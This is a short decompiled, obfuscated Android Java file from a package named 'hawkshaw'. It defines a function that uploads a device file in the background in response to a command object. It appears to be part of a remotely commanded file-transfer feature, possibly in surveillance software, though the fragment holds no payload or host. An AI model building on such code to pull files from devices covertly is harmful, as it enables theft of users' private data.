package com.hawkshaw.library.features.media.filecrud;

import O1.A;
import W2.y;
import X1.B;
import a3.e;
import android.content.Context;
import b3.C0298a;
import com.hawkshaw.library.datalayer.models.Command;
import java.io.File;
import t3.N;

public final class TusFileUploadKt {
    private static final String TAG = "TusFileUpload";

    public static final Object uploadFileTus(Context context, File file, Command.FileRequest.Source source, int i5, e eVar) {
        Object B4 = B.B(N.f9292c, new A(context, file, source, i5, (e) null), eVar);
        return B4 == C0298a.f4140D ? B4 : y.f2418a;
    }
}
